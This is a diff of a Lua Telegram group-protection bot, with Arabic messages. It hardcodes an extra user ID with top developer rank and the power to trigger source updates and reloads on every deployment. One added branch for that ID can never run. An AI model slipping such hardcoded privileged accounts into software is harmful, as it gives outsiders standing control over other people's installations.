@@ -1,8 +1,8 @@
 local function download(file_id, dl_cb, cmd)
-  tdcli_function ({
+tdcli_function ({
     ID = "DownloadFile",
     file_id_ = file_id
-  }, dl_cb, cmd)
+}, dl_cb, cmd)
 end
 
 
@@ -264,13 +264,17 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 1405398498 then 
+if msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 665877797 then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
 elseif msg.sender_user_id_ == 1399282735 then 
 msg.TheRankCmd = 'مُـحمد سَـالِـم'
 msg.TheRank = 'مُـحمد سَـالِـم'
+msg.Rank = 1
+elseif msg.sender_user_id_ == 665877797 then
+msg.TheRankCmd = 'مُـؤيـد'
+msg.TheRank = 'مُـؤيـد'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(nk..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
@@ -352,9 +356,9 @@ end
 if msg.content_.members_[0].id_ == our_id and redis:get(nk..':WELCOME_BOT') then
 SUDO_USER = redis:hgetall(nk..'username:'..SUDO_ID).username
 sendPhoto(msg.chat_id_,msg.id_,redis:get(nk..':WELCOME_BOT'),[[⌯ مـرحبآ آنآ بوت آسـمـي ]]..redis:get(nk..':NameBot:')..[[ 
- آختصـآصـي حمـآيهہ‏‏ آلمـجمـوعآت
+آختصـآصـي حمـآيهہ‏‏ آلمـجمـوعآت
 مـن آلسـبآم وآلتوجيهہ‏‏ وآلتكرآر وآلخ...
- مـعرف آلمـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[ ]])
+مـعرف آلمـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[ ]])
 return false
 end
 if not ISONEBOT then
@@ -603,19 +607,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1399282735) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1399282735 or msg.sender_user_id_ == 665877797) then
 return sendMsg(msg.chat_id_,msg.id_,".تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1399282735) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1399282735 or msg.sender_user_id_ == 665877797) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'| {* تــم تحديث وتثبيت السورس  *} .\n\n| { Bot is Update » }',function(arg,data)
 dofile("./YEMEN/Run.lua")
 print("Reload ~ ./YEMEN/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1399282735) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1399282735 or msg.sender_user_id_ == 665877797) then
 sendMsg(msg.chat_id_,msg.id_,'| {* تــم أعـاده تشغيل البوت  *} .\n\n| { Bot is Reloaded » }',function(arg,data)
 dofile("./YEMEN/Run.lua")
 print("Reload ~ ./YEMEN/Run.lua")
